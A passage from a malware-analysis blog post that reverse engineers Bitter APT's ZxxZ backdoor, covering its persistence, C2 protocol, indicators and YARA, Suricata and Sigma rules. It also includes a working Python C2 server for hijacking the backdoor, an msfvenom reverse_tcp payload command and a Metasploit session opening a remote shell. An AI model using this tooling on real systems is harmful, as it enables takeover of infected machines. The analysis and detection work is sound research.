</code></pre><p>The <em>CreateStartupLNK</em> function, shown above, uses the COM Interface <em>Shortcut->IShellLinkA</em>. This corresponds to the following COM GUIDs.</p><table><thead><tr><th>GUID</th><th>Type</th><th>Name</th></tr></thead><tbody><tr><td>00021401-0000-0000-c000-000000000046</td><td>CLSID</td><td>Shortcut</td></tr><tr><td>000214EE-0000-0000-C000-000000000046</td><td>InterfaceID</td><td><a href=https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-ishelllinka>IShellLinkA</a></td></tr></tbody></table><p>It will also set the LNK comment to <em>App</em>.</p><pre><code class=language-cpp>hResult = CoCreateInstance(
	(IID *)&amp;00021401-0000-0000-c000-000000000046,
	(LPUNKNOWN)NULL,
	1,
    (IID *)&amp;000214EE-0000-0000-C000-000000000046,
    &amp;ppv);
if (-1 &lt; hResult) {
	pszFile = (LPCSTR)pszFileCheck;
	iLength = lstrlenA(&amp;PATH);
	rLength = iLength + 1;
	LocalRealloc(&amp;pszFile,pszFileCheck,rLength);
	eError = memcpy_s(pszFile,rLength,&amp;PATH,rLength);
	ExceptionHandler(eError);
	(*ppv-&gt;lpVtbl-&gt;SetPath)(ppv,pszFile);
	// ...
</code></pre><p>Once the LNK in has been created in the startup folder, it will sleep for 20 seconds. Then it will copy itself to <em>%UserProfile%\AppData\Local\Updates\tmp.exe</em>. It will then create a handle to the file <em>%UserProfile%\AppData\Local\Updates\systemlog</em>, and write the characters <em>aa</em>.</p><p>Interestingly, at this stage it will use <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea>shell32.ShellExecuteA</a></em> to execute <em>%UserProfile%\AppData\Local\Updates\tmp.exe</em> (itself) before exiting its own process.</p><p>Once the <em>tmp.exe</em> (itself) has been executed again, it will skip over the persistence mechenisims discussed previously and begin collecting information about the machine. This information includes the <em>username</em>, <em>computername</em> and <em>productname</em>. This data will be stored in the URI parameter string <em>&lt;ComputerName>&&user=&lt;Username>&&OsI=&lt;ProductName></em>.</p><p>It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-copyfileexa>kernel32.CopyFileExA</a></em> to copy the aforementioned <em>tmp.exe</em> to <em>update.exe</em>. The following is the directory listing where the payload is stored for persistence.</p><pre><code class=language-text>PS C:\Users\malware\AppData\Local\Updates&gt; ls
    Directory: C:\Users\malware\AppData\Local\Updates
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         6/29/2022  11:07 PM          2 systemlog  (To check if installed)
-a---         6/29/2022   6:47 AM      53248 tmp.exe    (Payload)
-a---         6/29/2022   6:47 AM      53248 update.exe (Payload)
</code></pre><p>Persistence has now been established as it will surivive a reboot.</p><h4 id=c2-communication>C2 Communication</h4><p>Bitter APT&rsquo;s ZxxZ backdoor follows a minimal approach to C2 communication. The only command sent by the C2 server is the payload to execute next. This ensures that they can deploy new payloads at will anytime persistence is achieved. However, it will communicate with the C2 server every 17 seconds regardless if it has received any new payloads or not, which does generate noise on the infected network.</p><p>No payload is perfect. However, I can certainly see its appeal for a large scale offensive campaign from an operational perspective.</p><h5 id=behavior>Behavior</h5><p>The overall C2 behavior can be explained as follows.</p><p><img src=/images/5.png alt=c2-overview>
<em>Figure 6: High Level C2 Behavior Overview</em></p><p>Now that we understand the high level concepts, let&rsquo;s discuss the details and see what the C2 traffic looks like.</p><p>Once persistence has been established, it will communicate to the C2 server using the string we identified earlier as the URI parameters.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/SzWvcxuer/userlog.php?id=MALWARE-PC&amp;&amp;user=yourmom&amp;&amp;OsI=Windows7Ultimate HTTP/1.1
Host:subscribe[.]tomcruefrshsv[.]com
Connection: close
</code></pre><p>The C2 checkin URI parameters are as follows.</p><table><thead><tr><th>URI Parameter</th><th>Description</th></tr></thead><tbody><tr><td>id</td><td>ComputerName</td></tr><tr><td>user</td><td>Username</td></tr><tr><td>OsI</td><td>ProductName</td></tr></tbody></table><p>Threat actors don&rsquo;t often realize that the omission of the <em>User-Agent</em> header makes the communication identifiable amongst legitimate browsing traffic. Not only this, but they are using <em>&&</em> for additional URI parameters. The standard is to use only one <em>&</em>, making this even more identifiable. It is common practice to pick on these mistakes and write very effective detection.</p><p>By using <em>dnsmasq</em> to change the C2 domain IP address it will allow us to write our own C2 server code to interact with the malware. Using <em>nslookup</em> we can confirm the C2 domain is now resolving to a local IP address we control.</p><pre><code class=language-text>PS C:\Users\malware&gt; nslookup subscribe.tomcruefrshsvc.com
Name:    subscribe.tomcruefrshsvc.com
Address:  10.0.2.1
</code></pre><p>Once the malware has sent its C2 checkin, it will then check the response for the first occurance of the <em>&lt;ComputerName>&lt;Username></em> that it sent using <em><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strstr-wcsstr-mbsstr-mbsstr-l?view=msvc-170">strstr</a></em>.</p><pre><code class=language-cpp>pcResult = strstr(C2Response,&amp;ComputerNameUsername);
if (pcResult != (char *)NULL) {
	// &lt;c2-ops-here&gt;
}
</code></pre><p>After this has completed, it will parse between the double quotes for a process name. If a process name is provided, it will check to see if that process is currently running. If it is running, it will respond to the C2 server with the following response.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RNGZxxZexplorerZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
</code></pre><p>The format is <em>RNG&lt;delimiter>&lt;process-name>&lt;delimiter>&lt;computername>&lt;username></em>. Interestingly, <em>RNG</em> is hardcoded and stored as a scalar operand in little endian.</p><pre><code class=language-asm>mov dword ptr [CHAR_ARRAY_00407950], 0x474e52
</code></pre><p>If the process is not running, it will perform the following request.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/WqeC812CCvU/&lt;payload&gt; HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
</code></pre><p>It will then create the folder <em>%AppData%\Local\Debug</em>. If unsuccessful, it will instead create the directory <em>C:\&lt;username>\Templates</em>.</p><pre><code class=language-cpp>hResult = SHGetFolderPathA((HWND)NULL, CSIDL_LOCAL_APPDATA, (HANDLE)NULL, NULL, pszPath);
if (hResult == NULL) {
	strcat_s(pszPath,250,&quot;\\&quot;);
    strcat_s(pszPath,250,&quot;Debug&quot;);
    _mkdir(pszPath);
} else {
	hResult = SHGetFolderPathA((HWND)NULL,CSIDL_TEMPLATES,(HANDLE)NULL,NULL,pszPath);
	if (hResult != 0) {
		return 0;
	}
}
</code></pre><p>Once the directory is created, it will concatenate the payload name with the extension <em>.exe</em>. After this, it will write the first byte <em>M</em> manually, then write the rest of the payload sent from the C2 server to disk, ignoring the first 0xf65 bytes of data sent.</p><p>It will then make the following request to let the C2 server know the payload is being executed.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=DN-SZxxZpayload.vbsZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
</code></pre><p>Once this has been sent to the C2 server, it will finally execute the payload using <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea>shell32.ShellExecuteA</a></em>.</p><p><img src=/images/6.png alt=execute-payload>
<em>Figure 7: Executing Payload with <a href=https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea>shell32.ShellExecuteA</a></em></p><p>After the payload has been executed, it will check to see if the processes was created successfully. This feature of course has timing issues for additional payloads sent by the C2 server that do not run in an infinite loop. üòÖ</p><p>If the payload process is running it will send the following request to the C2 server.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=SZxxZpayloadZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
</code></pre><p>If the payload process is not running, it will send the following request to the C2 server.</p><pre><code class=language-http>GET /VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php?txt=RN_EZxxZpayloadZxxZMALWARE-PCmalware HTTP/1.1
Host:subscribe.tomcruefrshsvc.com
Connection: close
</code></pre><p>It will then sleep for <em>15</em> seconds and repeat the loop.</p><p>Interestingly, while they <em>obfuscated</em> (very poorly) the payload in the network traffic by prepending it with garbage data. They do not follow suit in storing their payloads in any obfuscated way on disk. Which means, they will have to be very careful not to be detected.</p><h5 id=c2-responses>C2 Responses</h5><p>At this point we can map out the following C2 responses and their meaning.</p><table><thead><tr><th>C2 Response</th><th>Description</th></tr></thead><tbody><tr><td>RNG</td><td>Payload is already running</td></tr><tr><td>DN-S</td><td>Payload is executing</td></tr><tr><td>S</td><td>Executed payload is running</td></tr><tr><td>RN_E</td><td>Executed payload is not running</td></tr></tbody></table><h5 id=c2-server-code>C2 Server Code</h5><p>Now that we know everything there is to know about how Bitter APT&rsquo;s ZxxZ backdoor communicates with its C2 server. We can implement our own C2 server to manipulate it to execute our own payloads.</p><p>For this we will use <a href=https://www.python.org/>Python</a> and <a href=https://flask.palletsprojects.com/en/2.1.x/>Flask</a>.</p><pre><code class=language-python>#!/usr/bin/env python

import sys
import os
import logging
import argparse
from flask import Flask
from flask import request

__version__ = '1.0.0'
__author__  = 'c3rb3ru5d3d53c'

parser = argparse.ArgumentParser(
    prog=f'zxxz v{__version__}',
    description='Bitter APT ZxxZ Backdoor C2 Server',
    epilog=f'Author: {__author__}')

parser.add_argument(
    '--version',
    action='version',
    version=f'v{__version__}')

parser.add_argument(
    '-i',
    '--input',
    type=str,
    default=None,
    help='Input Payload',
    required=False)

parser.add_argument(
    '--host',
    type=str,
    default='0.0.0.0',
    required=False,
    help='Listen Host')

parser.add_argument(
    '-p',
    '--port',
    type=int,
    default=80,
    required=False,
    help='Listen Port')

parser.add_argument(
    '-d',
    '--debug',
    action='store_true',
    default=False,
    required=False,
    help='Debug')

args = parser.parse_args()

logging.basicConfig(level=logging.DEBUG)

payload_name = os.path.basename(args.input)     # Payload filename (.exe appened on clientside)
payload_name = payload_name.replace('.exe', '')
magic_0      = 'RNG'                            # Payload is already running
magic_1      = 'DN-S'                           # Payload is executing
magic_2      = 'S'                              # Executed payload is running
magic_3      = 'RN_E'                           # Executed payload is not running
delim        = 'ZxxZ'                           # URI arameter delimiter

payload_data = open(args.input, 'rb').read()

app = Flask(__name__)

def payload_is_already_running(data):
    &quot;&quot;&quot;
    Payload is already running
    &quot;&quot;&quot;
    data = data[7:]
    data = data.split(delim)
    process_name = data[0]
    computer = data[1]
    app.logger.info(f'[{computer}] {process_name} is already running')
    return process_name

def payload_is_executing(data):
    &quot;&quot;&quot;
    Payload is executing
    &quot;&quot;&quot;
    data = data[8:]
    data = data.split(delim)
    process_name = data[0]
    computer = data[1]
    app.logger.info(f'[{computer}] {process_name} is executing')
    return process_name

def payload_is_running(data):
    &quot;&quot;&quot;
    Executed payload is running
    &quot;&quot;&quot;
    data = data[1:]
    data = data.split(delim)
    process_name = data[0]
    computer = data[1]
    app.logger.info(f'[{computer}] {process_name} is running')
    return process_name

def payload_is_not_running(data):
    &quot;&quot;&quot;
    Executed payload is not running
    &quot;&quot;&quot;
    data = data[8:]
    data = data.split(delim)
    process_name = data[0]
    computer = data[1]
    app.logger.info(f'[{computer}] {process_name} payload is not running')
    return process_name

@app.route('/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php', methods=['GET'])
def checkin():
    os           = request.args.get('OsI')  # Operating System
    username     = request.args.get('user') # Username
    computername = request.args.get('id')   # ComputerName
    app.logger.info(f'[checkin] {os}/{computername}/{username}')
    return f'{computername}{username}&quot;{payload_name}&quot;'

@app.route('/VcvNbtgRrPopqSD/SzWvcxuer/sDeRcEwwQaAsSN.php', methods=['GET'])
def status():
    data = request.args.get('txt')
    if data.startswith(magic_0 + delim):        # Payload is already running
        return payload_is_already_running(data)
    if data.startswith(magic_1 + delim):        # Payload is executing
        return payload_is_executing(data)
    if data.startswith(magic_2 + delim):        # Executed payload is running
        return payload_is_running(data)
    if data.startswith(magic_3 + delim):        # Executed payload is not running
       return payload_is_not_running(data)
    return 'invalid'

@app.route('/VcvNbtgRrPopqSD/WqeC812CCvU/&lt;payload&gt;', methods=['GET'])
def send_payload(payload):
    app.logger.info('sending payload')
    return b'A'*0xf65 + payload_data

app.run(debug=True, host='0.0.0.0', port=80)
</code></pre><p>When a C2 server is down, a great way to control the malware you are debugging is to run your own C2 server. This does come with its own challenges as we need to reverse engineer how the malware handles responses. But at least we are in control now! ü¶æ</p><p>To create our own payload we can do the following.</p><pre><code class=language-bash>msfvenom --platform windows --arch x86 -p windows/meterpreter/reverse_tcp LHOST=&lt;host&gt; LPORT=&lt;port&gt; -f exe -o payload.exe
</code></pre><p>We can now use this to execute our payload by performing the following.</p><pre><code class=language-bash>./zxxz.py --host 0.0.0.0 --port 80 --debug --input payload.exe
</code></pre><p>Then in metasploit we need to setup our listener. Once we have the C2 server <em>zxxz.py</em> running, our payload created and <em>metasploit</em> listening for the <em>meterpreter</em> <em>reverse_tcp</em> callback. We can run the malware on the infected VM. This will yield us a successful execution of our own payload resulting in a <em><a href=https://www.metasploit.com/>meterpreter</a></em> session.</p><pre><code class=language-bash>msfconsole
&gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0
msf6 exploit(multi/handler) &gt; set LPORT &lt;port&gt;
msf6 exploit(multi/handler) &gt; exploit
[*] Started reverse TCP handler on 0.0.0.0:4444 
[*] Sending stage (175174 bytes) to &lt;redacted&gt;
[*] Meterpreter session 3 opened (&lt;host&gt;:&lt;port&gt; -&gt; &lt;redacted&gt;:50218 ) at 2022-07-02 17:17:52 -0400

meterpreter &gt; shell
Process 772 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\malware\AppData\Local\Updates&gt;whoami
malware-pc\malware

C:\Users\malware\AppData\Local\Updates&gt; C:\Users\malware&gt;start &quot;C:\Program Files\Mozilla Firefox\firefox.exe&quot; &quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;

C:\Users\malware\AppData\Local\Updates&gt;exit
meterpreter &gt;
</code></pre><h5 id=proof-of-concept-poc>Proof of Concept (PoC)</h5><p>In this Proof of Concept (PoC) video I use my own C2 server for Bitter APT&rsquo;s ZxxZ backdoor and send my own <em>meterpreter</em> payload to the infected machine.</p><iframe width=560 height=315 src=https://www.youtube.com/embed/m3jrWoQK6sI title="YouTube video player" frameborder=0 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h5 id=summary>Summary</h5><p>This kind of C2 analysis is a lot of work. üë∑‚Äç‚ôÄ</p><p>However, please consider the following benifits.</p><ul><li>Reliable detection signatures</li><li>Scanning the internet for other potential C2 servers</li><li>Debug future samples easier when the C2 server is down</li></ul><h2 id=configuration-extraction>Configuration Extraction</h2><p>Since we now understand how the malware decrypts its strings, I created an automated configuration extractor for <a href=https://github.com/c3rb3ru5d3d53c/mwcfg>mwcfg</a>. The following is an example of how to perform extraction on Bitter APT ZxxZ samples you might have.</p><pre><code class=language-bash>mwcfg --modules modules/ --input tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb --pretty
[
    {
        &quot;name&quot;: &quot;tests/bitter/cc7ddf9ed230ad4e060dfd0f32389efb&quot;,
        &quot;type&quot;: &quot;PE32 executable (GUI) Intel 80386, for MS Windows&quot;,
        &quot;mime&quot;: &quot;application/x-dosexec&quot;,
        &quot;md5&quot;: &quot;cc7ddf9ed230ad4e060dfd0f32389efb&quot;,
        &quot;sha1&quot;: &quot;05af416c3173cdb0b49d51db1db7b8f90639e3b8&quot;,
        &quot;sha256&quot;: &quot;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&quot;,
        &quot;configs&quot;: [
            {
                &quot;domain&quot;: &quot;subscribe.tomcruefrshsvc.com&quot;,
                &quot;family&quot;: &quot;bitter_zxxz&quot;
            }
        ]
    }
]
</code></pre><h2 id=classification>Classification</h2><p>I wouldn&rsquo;t call this malware a Remote Administration Tool (RAT) or a botnet for that matter. The functionality is quite simple. Accept a single command, which is the payload you wish to execute from the C2 server. With this in mind, I classify this malware as a backdoor.</p><h2 id=conclusion>Conclusion</h2><p>We reverse engineered Bitter APT&rsquo;s ZxxZ backdoor to the point we can repurpose it for our own red team operations. What I really wanted to show with this analysis and Proof of Concept (PoC), is that we need to be very careful with our attribution of threat actors. It is undeniably possible for one nation-state threat actor to frame another using similar methods. Based on this analysis, it would also not suprise me if this behavior is already happening in the wild.</p><p><img src=/images/7.png alt=attribution></p><p>Cisco Talos also did an analysis on ZxxZ backdoor entitled <a href=https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html>Bitter APT adds Bangladesh to their Targets</a>. Although this is a great report, I wanted to do more with this malware to showcase what is possible.</p><p>I could certainly weaponize their code by writing a utility to patch the maldoc exploit and backdoor. However, I have decided against doing this as it would make it too easy for skiddies to parade around as Bitter APT and cause more mayhem for our industry.</p><p>Although I do poke fun at Bitter APT&rsquo;s mistakes, this attack chain from them shows that they are capable of being a notable threat to Pakistan üáµ‚Äçüá∞. While they are not delivering the most advanced attack in this example, these APT groups usually are large orgainzations of people with a large variety of skill levels. This malware would appear to be created by someone who is likely new to developing nation state quality malware. I wonder if they have quality control as part of their standard processes and procedures, perhaps we will never know. üòÖ</p><p>I think we successfully destroyed Bitter APT&rsquo;s ZxxZ backdoor now. üòú</p><p><img src=/images/3.jpg alt=destroyed></p><h2 id=downloads>Downloads</h2><ul><li><a href=/samples/2022-07-04-zxxz.zip>Samples and Ghidra Project</a></li></ul><h2 id=indicators>Indicators</h2><p>This section covers all the indicators covered in the report.</p><h3 id=static>Static</h3><table><thead><tr><th>Type</th><th>Filename</th><th>Description</th><th>SHA256</th></tr></thead><tbody><tr><td>hash</td><td>sample_0.bin</td><td>Maldoc</td><td><font style=color:red>9a8b201eb2bebe309d15c7b0ab5a6dcde460b84b035bb3575d4a0ec6af51a37e</font></td></tr><tr><td>hash</td><td>sample_1.bin</td><td>OLE Object</td><td><font style=color:red>96e61b3f2c3c4ffe065c0aa492145b90956b45660bd614e5924ef9b6dade3c57</font></td></tr><tr><td>hash</td><td>sample_2.bin</td><td>OLE Stream</td><td><font style=color:red>f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f</font></td></tr><tr><td>hash</td><td>sample_3.bin</td><td>Decrypted Shellcode</td><td><font style=color:red>d6fdc95e74aea3f7072ca713213ff157c0999f53b3b130f8217ea63231b109ad</font></td></tr><tr><td>url</td><td></td><td>MSI Payload</td><td><font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font></td></tr><tr><td>domain</td><td></td><td>MSI Payload</td><td><font style=color:red>sbss[.]com[.]pk</font></td></tr><tr><td>ip</td><td></td><td>MSI Payload</td><td><font style=color:red>203[.]124[.]44[.]180</font></td></tr><tr><td>hash</td><td>sample_4.bin</td><td>MSI Installer</td><td><font style=color:red>b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611</font></td></tr><tr><td>hash</td><td>sample_5.bin</td><td>CAB Archive</td><td><font style=color:red>42745ddb257a25671f18ff6c2ad38e9c89b64f4d13f4412097691384e626672f</font></td></tr><tr><td>hash</td><td>sample_6.bin</td><td>PE Payload</td><td><font style=color:red>09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe</font></td></tr><tr><td>domain</td><td></td><td>C2 Domain</td><td><font style=color:red>subscribe[.]tomcruefrshsv[.]com</font></td></tr><tr><td>ip</td><td></td><td>C2 IP</td><td><font style=color:red>185[.]7[.]33[.]56</font></td></tr></tbody></table><h3 id=ttps>TTPs</h3><table><thead><tr><th>ID</th><th>Tactic</th><th>Technique</th></tr></thead><tbody><tr><td><a href=https://attack.mitre.org/techniques/T1203/>T1203</a></td><td>Execution</td><td>Exploitation for Client Execution</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1547/>T1547</a></td><td>Persistence</td><td>Boot or Logon Autostart Execution</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1095/>T1095</a></td><td>Command and Control</td><td>Non-Application Layer Protocol</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1592/>T123</a></td><td>Reconnaissance</td><td>Gather Victim Host Information</td></tr><tr><td><a href=https://attack.mitre.org/techniques/T1001/>T1001</a></td><td>Command and Control</td><td>Data Obfuscation</td></tr></tbody></table><h3 id=graph>Graph</h3><iframe src=https://www.virustotal.com/graph/embed/gca09a155495b4964a06b646bd6f44968497a6599a6a44c239db66e0410c5a9bd width=700 height=400></iframe><h2 id=detection>Detection</h2><p>I&rsquo;m providing the following signatures to help the community detect this threat.</p><h3 id=yara>YARA</h3><pre><code class=language-python>rule malware_bitter_zxxz_0 {
	meta:
		author      = &quot;c3rb3ru5d3d53c&quot;
		description = &quot;MALWARE Bitter APT ZxxZ Backdoor&quot;
		hash        = &quot;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&quot;
		reference   = &quot;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&quot;
		created     = &quot;2022-07-01&quot;
		os          = &quot;windows&quot;
		tlp         = &quot;white&quot;
		rev         = 1
	strings:
		$delimiter        = &quot;ZxxZ&quot; ascii wide
		$rng              = {c7 05 ?? ?? ?? ?? 52 4e 47 00}
		$string_decryptor = {53 3b ca 75 ?? 33 c9 8a 1c ?? 30 1c ?? 40 41 3b c6 7c}
	condition:
		uint16(0) == 0x5a4d and
        uint32(uint32(0x3c)) == 0x00004550 and
		filesize &lt; 4128028 and
        2 of them
}

rule heuristic_xor_strings_0 {
    meta:
        author      = &quot;c3rb3ru5d3d53c&quot;
        description = &quot;HEURISTIC Suspicious XOR Strings&quot;
        reference   = &quot;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&quot;
        hash        = &quot;f0d4d43cd6f3c33ed78d13722e81d03f21101edbc15cb0782448d0843fb2bf7f&quot;
        created     = &quot;2022-06-27&quot;
        type        = &quot;heuristic&quot;
        os          = &quot;windows&quot;
        tlp         = &quot;white&quot;
        rev         = 1
    strings:
        $str_0 = &quot;://&quot;            xor
        $str_1 = &quot;LoadLibrary&quot;    xor
        $str_2 = &quot;GetProcAddress&quot; xor
        $str_3 = &quot;ShellExecute&quot;   xor
        $str_4 = &quot;kernel32&quot;       xor
    condition:
        any of ($str_*)
}

rule heuristic_pe_default_project_name_0 {
	meta:
		author      = &quot;c3rb3ru5d3d53c&quot;
		description = &quot;HEURISTIC Binary Default Project Name&quot;
		reference   = &quot;https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/&quot;
		hash        = &quot;09bb6b01db8b2177779d90c5444d91859994a1c2e907e5b444d6f6e67d2cfcfe&quot;
		created     = &quot;2022-06-29&quot;
		os          = &quot;windows&quot;
		tlp         = &quot;white&quot;
		rev         = 1
	strings:
		$project_name_0 = &quot;NewProject_&quot; ascii wide
	condition:
		uint16(0) == 0x5a4d and
        uint32(uint32(0x3c)) == 0x00004550 and
        any of ($project_name_*)
}
</code></pre><h3 id=suricata>Suricata</h3><pre><code class=language-python>alert http $HOME_NET any -&gt; $EXTERNAL_NET any (
	msg:&quot;MALWARE Bitter APT ZxxZ Backdoor C2 Checkin&quot;;
	content:&quot;GET&quot;; http_method;
	content:&quot;&amp;&amp;&quot;; http_uri; fast_pattern;
	content:&quot;OsI=&quot;; http_uri;
	content:!&quot;User-Agent|3a 20|&quot;; http_header;
	flow:to_server, established;
	reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/;
	metadata:created 2022-06-30, type malware.backdoor, os windows, tlp white;
	classtype:trojan-activity;
	sid:1000016;
	rev:1;
)
alert http $HOME_NET any -&gt; $EXTERNAL_NET any (
	msg:&quot;MALWARE Bitter APT ZxxZ Backdoor C2 Beacon&quot;;
	content:&quot;GET&quot;; http_method;
	content:&quot;ZxxZ&quot;; http_uri; fast_pattern;
	pcre:&quot;/=(RNG|DN-S|S|RN_E)/U&quot;;
	flow:to_server, established;
	reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/;
	metadata:created 2022-06-30, type malware.backdoor, os windows, tlp white;
	classtype:trojan-activity;
	sid:1000017;
	rev:1;
)
alert http $HOME_NET any -&gt; $EXTERNAL_NET any (
	msg:&quot;HEURISTIC Suspicious MSI Installer Activity&quot;;
	content:&quot;GET&quot;; http_method;
	content:&quot;Windows Installer&quot;; http_user_agent; fast_pattern;
	pcre:&quot;/\.com\.pk|xyz|tk|top|hopto\.org|linkpc\.net|portmap\.io|ngrok\.io|ddns\.net|duckdns\.org)$/W&quot;;
	flow:to_server, established;
	reference:url, https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/;
	metadata:created 2022-07-04, type heuristic, os windows, tlp white;
	classtype:misc-attack;
	sid:1000015;
	rev:1;
)
</code></pre><h3 id=sigma>Sigma</h3><pre><code class=language-yml>id: eb65d88b-3f45-4ed4-bb51-23b39bbcf9e3
title: HEURISTIC Suspicious Startup File Created
description: Detects suspicious startup files being created
reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/
author: c3rb3ru5d3d53c
created: 2022-06-30
type: heuristic
os: windows
tlp: white
rev: 1
logsource:
  product: windows
  category: file_creation
detection:
  selection_0:
    TargetFilename|contains:
      - '\Start Menu\Programs\Startup\'
  selection_1:
    TargetFilename|endswith:
      - '\update.LNK'
  condition: selection_0 and selection_1
falsepositives:
  - Unknown
</code></pre><pre><code class=language-yml>id: c2b9e035-f225-49f9-8161-776b64ab16d0
title: HEURISTIC Suspicious Process Created in AppData Folder
description: Detects suspicious startup files being created
reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/
author: c3rb3ru5d3d53c
created: 2022-06-30
type: heuristic
os: windows
tlp: white
rev: 1
logsource:
  product: windows
  category: process_creation
detection:
  selection_0:
    Image|contains:
      - '\AppData\Local\'
  selection_1:
    Image|endswith:
      - '\tmp.exe'
  condition: selection_0 and selection_1
falsepositives:
  - Unknown
</code></pre><pre><code class=language-yml>id: 653014f7-1b43-4355-8616-c521baac9bf4
title: EXPLOIT Equation Editor Exploit RCE (CVE-2017-11882)
description: Detects exploitation of CVE-2017-11882
reference: https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/
created: 2022-07-04
type: exploit.rce
os: windows
tlp: white
rev: 1
logsource:
  category: process_creation
  product: windows
detection:
  selection_0:
    ParentImage|endswith:
	  - '\EQNEDT32.EXE'
  condition: selection_0
falsepositives:
  - Unknown
</code></pre><p>All these signatures are available on my <a href=https://github.com/c3rb3ru5d3d53c/signatures/>signatures</a> GitHub repository.</p><h2 id=references>References</h2><ul><li><a href=https://twitter.com/ShadowChasing1/status/1478259210110775297>ShadowChasing1 Tweet</a></li><li><a href=https://blog.talosintelligence.com/2022/05/bitter-apt-adds-bangladesh-to-their.html>Bitter APT adds Bangladesh to their targets</a></li></ul></article><div class=my-4><a href=https://c3rb3ru5d3d53c.github.io/tags/bitter/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#bitter</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/hazytiger/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#hazytiger</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/t-apt-17/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#t-apt-17</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/apt-c-08/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#apt-c-08</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/asia/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#asia</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/pakistan/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pakistan</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/apt/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#apt</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/maldoc/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#maldoc</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/payload/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#payload</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/reversing/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#reversing</a>
<a href=https://c3rb3ru5d3d53c.github.io/tags/malware/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#malware</a>
